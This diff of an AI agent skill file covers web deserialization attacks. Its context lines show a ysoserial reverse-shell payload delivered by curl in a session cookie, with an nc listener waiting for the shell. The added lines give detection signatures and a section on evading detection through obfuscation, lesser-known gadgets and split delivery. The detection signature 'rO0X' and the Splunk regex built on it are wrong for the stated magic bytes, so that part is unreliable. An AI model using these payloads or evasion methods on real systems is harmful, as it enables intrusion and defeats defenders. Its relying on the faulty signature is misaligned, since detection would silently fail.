@@ -2,7 +2,7 @@
 name: web-deserialization
 description: "Deserialization vulnerabilities arise when an application reconstructs objects from byte streams (Java), serialized strings (PHP), Base64 blobs (.NET), or pickle data (Python) supplied by the client."
 origin: openclaw
-version: "0.1.21"
+version: "0.2.0.2"
 compatibility:
   - openclaw
   - claude-code
@@ -21,6 +21,7 @@ metadata:
   guide_count: 5
   owasp: "A08:2021-Software Integrity Failures"
   mitre: "T1190-Exploit Public-Facing App"
+  last_reviewed: "2026-07-26"
 ---
 
 
@@ -480,3 +481,27 @@ java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64_REVERSE_SHELL}
 curl -s http://target/api -H "Cookie: session=FINAL_PAYLOAD" &
 nc -lvnp 4444  # Catch reverse shell
 ```
+## Detection Methods
+
+### Deserialization Vulnerability Detection
+- **Payload signatures**: Java serialized magic bytes `rO0X` (Base64 of 0xAC ED 00 05); PHP serialized `O:N:"..."`.
+- ** gadget chain detection**: `InvokerTransformer`, `AnnotationInvocationHandler` in deserialized data.
+- **Anomalous object types**: Unexpected class names in serialized stream.
+
+### SIEM Detection Rules
+- **Splunk SPL**: `index=web | regex body="rO0X|O:\d+:|\"\$class\""`
+- **ModSecurity CRS**: Rules for deserialization payload signatures.
+- **RASP (Runtime Application Self-Protection)**: Native deserialization validation.
+
+## Defense Evasion Techniques
+
+### Payload Obfuscation
+- **Encoding tricks**: Base64 / hex / Gzip the serialized payload.
+- **Custom serializers**: Some apps use custom serializers; format may not match standard signatures.
+- **Polymorphic gadgets**: Use less-known gadgets not in detection rules.
+
+### Detection Bypass
+- **Slow payload delivery**: Split payload across multiple requests; below threshold.
+- **Use binary protocol**: Hessian, Kryo, Protocol Buffers; less signature coverage than Java serialization.
+- **JSON deserialization abuse**: Jackson, GSON, fastjson vulnerabilities; different signatures than binary.
+
